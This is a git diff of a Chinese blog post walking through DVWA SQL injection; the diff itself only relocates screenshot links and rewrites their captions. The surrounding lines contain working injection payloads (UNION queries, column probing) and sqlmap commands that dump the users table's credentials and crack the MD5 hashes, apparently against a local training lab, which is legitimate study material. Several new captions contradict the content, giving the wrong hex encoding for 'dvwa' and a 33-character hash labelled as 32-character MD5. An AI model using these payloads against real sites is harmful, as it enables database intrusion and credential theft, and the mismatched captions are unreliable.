@@ -14,7 +14,7 @@ tags:
 
 ## DVWASQLInjection
 
-![DVWA 通关指南封面：灰底上的 DVWA 标志](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735688.jpeg)
+![DVWA 通关指南封面：灰底上的 DVWA 标志](/images/blog/20251225165735688.jpeg)
 
 
 
@@ -66,13 +66,13 @@ tags:
 
 提问：get和post提交方式对SQL注入的实施有什么影响？
 
- ![地址栏为 ?id=1&Submit=Submit，页面回显 ID:1、First name: admin](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735689.png)
+ ![地址栏为 ?id=1&Submit=Submit，页面回显 ID:1、First name: admin](/images/blog/20251225165735689.png)
 
 **二、判断服务器处理类型（数字型或字符型）** 
 
 加单引号，提交 `1'` ，出现报错信息，显示多出一个单引号，可以确定为字符型注入
 
- ![输入单引号后页面报 SQL syntax 错误，说明存在注入点](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735690.png)
+ ![输入单引号后页面报 SQL syntax 错误，说明存在注入点](/images/blog/20251225165735690.png)
 
 **三、判断注入点** 
 
@@ -82,7 +82,7 @@ tags:
 1' or 1=1#
 ```
 
- ![输入 1' or 1=1# 后一次回显出全部 5 个用户](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735691.png)
+ ![输入 1' or 1=1# 后一次回显出全部 5 个用户](/images/blog/20251225165735691.png)
 
 **四、判断列数** 
 
@@ -94,11 +94,11 @@ tags:
 1' order by 3# 
 ```
 
- ![输入 1' order by 1#，回显正常](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735692.png)
+ ![输入 1' order by 1#，回显正常](/images/blog/20251225165735692.png)
 
- ![输入 1' order by 2#，回显同样正常](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735693.png)
+ ![输入 1' order by 2#，回显同样正常](/images/blog/20251225165735693.png)
 
- ![order by 3# 报 Unknown column '3'，据此确定只有 2 列](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735694.png)
+ ![order by 3# 报 Unknown column '3'，据此确定只有 2 列](/images/blog/20251225165735694.png)
 
 当提交 `1' order by 3#` 时出现报错信息，说明目标数据库表中的列数为2
 
@@ -112,7 +112,7 @@ tags:
 1' union select 1,database()#
 ```
 
- ![union select 1,database() 回显出当前库名 dvwa](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735695.png)
+ ![union select 1,database() 回显出当前库名 dvwa](/images/blog/20251225165735695.png)
 
 2、提取表名
 
@@ -131,7 +131,7 @@ tags:
 Illegal mix of collations for operation 'UNION'
 ```
 
- ![直接 union 查表名报 Illegal mix of collations](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735696.png)
+ ![直接 union 查表名报 Illegal mix of collations](/images/blog/20251225165735696.png)
 
 这是由于MySQL在执行 `UNION` 操作时遇到的不同字符集之间的冲突报错。
 
@@ -145,7 +145,7 @@ alter table users modify last_name varchar(15) character set utf8 collate utf8_g
 
 修改完毕后，命令执行成功
 
- ![改用 information_schema.tables 查出 guestbook 与 users 两张表](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735697.png)
+ ![改用 information_schema.tables 查出 guestbook 与 users 两张表](/images/blog/20251225165735697.png)
 
 3、提取字段名
 
@@ -155,7 +155,7 @@ alter table users modify last_name varchar(15) character set utf8 collate utf8_g
 1' union select 1,column_name from information_schema.columns where table_name='users'#
 ```
 
- ![查 users 表字段，红框标出 user 与 password 两列](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735698.png)
+ ![查 users 表字段，红框标出 user 与 password 两列](/images/blog/20251225165735698.png)
 
 4、提取值
 
@@ -167,7 +167,7 @@ alter table users modify last_name varchar(15) character set utf8 collate utf8_g
 
 执行命令出现同样的字符编码问题，解决方法还是修改字段的字符集
 
- ![未加 0x 前缀的同类查询再次报 collations 错误](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735699.png)
+ ![未加 0x 前缀的同类查询再次报 collations 错误](/images/blog/20251225165735699.png)
 
 ```mysql
 alter table users modify user varchar(15) character set utf8 collate utf8_general_ci;
@@ -176,9 +176,9 @@ alter table users modify password varchar(50) character set utf8 collate utf8_ge
 
 执行成功得到用户和密码的数据，密码为32位小写MD5，可以通过 [在线工具](https://www.cmd5.com/default.aspx) 解密
 
- ![union select user,password from users 回显账号与 32 位 MD5](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735700.png)
+ ![union select user,password from users 回显账号与 32 位 MD5](/images/blog/20251225165735700.png)
 
- ![在线 MD5 查询：5f4dcc3b3baa765d61d8327deb882cf99 解出 password](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735701.png)
+ ![在线 MD5 查询：5f4dcc3b3baa765d61d8327deb882cf99 解出 password](/images/blog/20251225165735701.png)
 
 **六、SQLmap工具使用** 
 
@@ -186,11 +186,11 @@ alter table users modify password varchar(50) character set utf8 collate utf8_ge
 sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=265uqla8dabr5jt04llgsk4sc9; security=low"
 ```
 
- ![地址栏显示 id=1&Submit=Submit#（红框），页面正常回显](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735702.png)
+ ![地址栏显示 id=1&Submit=Submit#（红框），页面正常回显](/images/blog/20251225165735702.png)
 
- ![Firefox 网络面板，红框标出 Cookie 里的 PHPSESSID 与 security=low](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735703.png)
+ ![Firefox 网络面板，红框标出 Cookie 里的 PHPSESSID 与 security=low](/images/blog/20251225165735703.png)
 
- ![sqlmap 识别后端为 MySQL 5.6，并提示连接被目标强制关闭后重试](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735704.png)
+ ![sqlmap 识别后端为 MySQL 5.6，并提示连接被目标强制关闭后重试](/images/blog/20251225165735704.png)
 
 1、提取库名
 
@@ -198,7 +198,7 @@ sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPS
 sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=265uqla8dabr5jt04llgsk4sc9; security=low" --dbs
 ```
 
- ![sqlmap 列出 5 个数据库：dvwa、information_schema、mysql、performance_schema、sys](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735705.png)
+ ![sqlmap 列出 5 个数据库：dvwa、information_schema、mysql、performance_schema、sys](/images/blog/20251225165735705.png)
 
 2、提取表名
 
@@ -206,7 +206,7 @@ sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPS
 sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=265uqla8dabr5jt04llgsk4sc9; security=low" -D dvwa --tables
 ```
 
- ![sqlmap 列出 dvwa 库的 2 张表：guestbook、users](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735706.png)
+ ![sqlmap 列出 dvwa 库的 2 张表：guestbook、users](/images/blog/20251225165735706.png)
 
 3、提取字段名
 
@@ -214,7 +214,7 @@ sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPS
 sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=265uqla8dabr5jt04llgsk4sc9; security=low" -D dvwa -T users --columns
 ```
 
- ![sqlmap 列出 users 表的 8 个字段及类型](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735707.png)
+ ![sqlmap 列出 users 表的 8 个字段及类型](/images/blog/20251225165735707.png)
 
 4、提取值
 
@@ -222,7 +222,7 @@ sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPS
 sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=i0ssj777jur6gqb9af6bd111tn; security=low" --batch -D dvwa -T users -C user,password --dump
 ```
 
- ![sqlmap dump 出 users 表的 5 条账号密码，并附上解出的明文](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735708.png)
+ ![sqlmap dump 出 users 表的 5 条账号密码，并附上解出的明文](/images/blog/20251225165735708.png)
 
 **七、分析后台脚本** 
 
@@ -288,21 +288,21 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 
 1、修改电脑代理服务器IP设置为127.0.0.1，端口设置为8888，Bur调整代理参数与电脑代理一致
 
- ![Edge 设置 → 系统，红框标出「打开计算机的代理设置」](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735710.png)
+ ![Edge 设置 → 系统，红框标出「打开计算机的代理设置」](/images/blog/20251225165735710.png)
 
- ![Windows 手动代理改为 127.0.0.1:8888](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735711.png)
+ ![Windows 手动代理改为 127.0.0.1:8888](/images/blog/20251225165735711.png)
 
- ![Burp 添加代理监听，Bind port 填 8888（红框）](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735712.png)
+ ![Burp 添加代理监听，Bind port 填 8888（红框）](/images/blog/20251225165735712.png)
 
 2、在DVWA中尝试提交一个ID，在BurpSuite的repeater中查看捕获到的提交信息。使用BurpSuite的repeater模块可以重复发送数据，查看返回数据。
 
- ![DVWA 下拉框选中 4 号用户](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735713.png)
+ ![DVWA 下拉框选中 4 号用户](/images/blog/20251225165735713.png)
 
- ![Burp 拦截到 POST 请求，红框为 id=4&Submit=Submit](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735714.png)
+ ![Burp 拦截到 POST 请求，红框为 id=4&Submit=Submit](/images/blog/20251225165735714.png)
 
- ![Burp 右键菜单里选择 Send to Repeater](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735715.png)
+ ![Burp 右键菜单里选择 Send to Repeater](/images/blog/20251225165735715.png)
 
- ![Repeater 中把 id 改为 1，页面回显 Pablo](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735716.png)
+ ![Repeater 中把 id 改为 1，页面回显 Pablo](/images/blog/20251225165735716.png)
 
 3、确认列数
 
@@ -312,9 +312,9 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 4 order by 3#
 ```
 
- ![Repeater 提交 id=4 order by 1#，页面正常返回](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735717.png)
+ ![Repeater 提交 id=4 order by 1#，页面正常返回](/images/blog/20251225165735717.png)
 
- ![Repeater 提交 order by 3#，响应报 Unknown column '3'](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735718.png)
+ ![Repeater 提交 order by 3#，响应报 Unknown column '3'](/images/blog/20251225165735718.png)
 
 4、库、表、字段、值
 
@@ -335,7 +335,7 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 4 union select 1,database()#
 ```
 
- ![Repeater 提交 union select 1,database()，红框回显 dvwa](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735719.png)
+ ![Repeater 提交 union select 1,database()，红框回显 dvwa](/images/blog/20251225165735719.png)
 
 提取表名
 
@@ -346,11 +346,11 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 4 union select 1,table_name from information_schema.tables where table_schema=0x64767761#
 ```
 
- ![直接写 'dvwa' 被引号转义，响应报语法错误](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735720.png)
+ ![直接写 'dvwa' 被引号转义，响应报语法错误](/images/blog/20251225165735720.png)
 
- ![Burp Decoder 把 dvwa 转成 ASCII Hex：6476776a](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735721.png)
+ ![Burp Decoder 把 dvwa 转成 ASCII Hex：6476776a](/images/blog/20251225165735721.png)
 
- ![用 0x6476776a 代替 'dvwa'，成功查出 guestbook 与 users（红框）](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735722.png)
+ ![用 0x6476776a 代替 'dvwa'，成功查出 guestbook 与 users（红框）](/images/blog/20251225165735722.png)
 
 提取字段名
 
@@ -358,7 +358,7 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 4 union select 1,column_name from information_schema.columns where table_schema=0x64767761 and table_name=0x7573657273#
 ```
 
- ![同样用 0x6476776a 查字段，红框标出 user、password](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735723.png)
+ ![同样用 0x6476776a 查字段，红框标出 user、password](/images/blog/20251225165735723.png)
 
 提取user、password的值
 
@@ -366,13 +366,13 @@ if( isset( $_REQUEST[ 'Submit' ] ) ) {
 4 union select user,password from users#
 ```
 
- ![Repeater 里 union select user,password，响应只回显一列 MD5（红框）](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735724.png)
+ ![Repeater 里 union select user,password，响应只回显一列 MD5（红框）](/images/blog/20251225165735724.png)
 
 SQLmap工具使用
 
 将第一步抓到的数据保存在桌面，命名为1.txt文件
 
- ![记事本里保存的原始请求头，其中 security=medium](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735725.png)
+ ![记事本里保存的原始请求头，其中 security=medium](/images/blog/20251225165735725.png)
 
 使用 `-r` 参数指定文件路径。
 
@@ -381,7 +381,7 @@ sqlmap -r C:\Users\yuexuan\Desktop\1.txt  --cookie "PHPSESSID=ef4ln5lm529kdmhri3
 // -r REQUESTFILE      从文件中读取 HTTP 请求
 ```
 
- ![sqlmap 在 medium 级别下同样列出 5 个数据库](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735726.png)
+ ![sqlmap 在 medium 级别下同样列出 5 个数据库](/images/blog/20251225165735726.png)
 
 操作步骤与前面一致，最后得到user、password数据
 
@@ -389,7 +389,7 @@ sqlmap -r C:\Users\yuexuan\Desktop\1.txt  --cookie "PHPSESSID=ef4ln5lm529kdmhri3
 sqlmap -r C:\Users\yuexuan\Desktop\1.txt  --cookie "PHPSESSID=ef4ln5lm529kdmhri3meltn9lk; security=medium" --batch -D dvwa -T users -C user,password --dump
 ```
 
- ![sqlmap dump 出 users 表 5 条记录](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735727.png)
+ ![sqlmap dump 出 users 表 5 条记录](/images/blog/20251225165735727.png)
 
 ```php
 <?php
@@ -431,13 +431,13 @@ mysqli_close($GLOBALS["___mysqli_ston"]);
 
 1、点击链接弹出小窗，提交1，使用BurpSuite抓包。
 
- ![点击 here to change your ID，弹出输入 Session ID 的小窗](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735728.png)
+ ![点击 here to change your ID，弹出输入 Session ID 的小窗](/images/blog/20251225165735728.png)
 
- ![Burp 拦截 session-input.php 的 POST 请求，Cookie 中 security=high](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735729.png)
+ ![Burp 拦截 session-input.php 的 POST 请求，Cookie 中 security=high](/images/blog/20251225165735729.png)
 
 尝试放包，回显信息出现在原页面
 
- ![改包后页面按 Session ID 回显出 admin](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735730.png)
+ ![改包后页面按 Session ID 回显出 admin](/images/blog/20251225165735730.png)
 
 2、注入方式与Low、Medium级别一致，最后得到user、password数据
 
@@ -445,7 +445,7 @@ mysqli_close($GLOBALS["___mysqli_ston"]);
 1' union select user,password from users#
 ```
 
- ![high 级别下用 1' union select user,password 仍能拿到整列 MD5](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735731.png)
+ ![high 级别下用 1' union select user,password 仍能拿到整列 MD5](/images/blog/20251225165735731.png)
 
 SQLmap工具使用
 
@@ -455,7 +455,7 @@ SQLmap工具使用
 sqlmap -r C:\Users\yuexuan\Desktop\1.txt --second-url "http://dvwa/vulnerabilities/sqli/" --cookie "PHPSESSID=ef4ln5lm529kdmhri3meltn9lk; security=high" --batch --dbs
 ```
 
- ![sqlmap 列出 6 个数据库，比之前多出 pikachu](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735732.png)
+ ![sqlmap 列出 6 个数据库，比之前多出 pikachu](/images/blog/20251225165735732.png)
 
 操作步骤与前面一致，最后得到user、password数据
 
@@ -463,7 +463,7 @@ sqlmap -r C:\Users\yuexuan\Desktop\1.txt --second-url "http://dvwa/vulnerabiliti
 sqlmap -r C:\Users\yuexuan\Desktop\1.txt --second-url "http://dvwa/vulnerabilities/sqli/" --cookie "PHPSESSID=ef4ln5lm529kdmhri3meltn9lk; security=high" --batch -D dvwa -T users -C user,password --dump
 ```
 
- ![sqlmap dump users 表，结果与前一级别一致](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735733.png)
+ ![sqlmap dump users 表，结果与前一级别一致](/images/blog/20251225165735733.png)
 
 ```php
 <?php
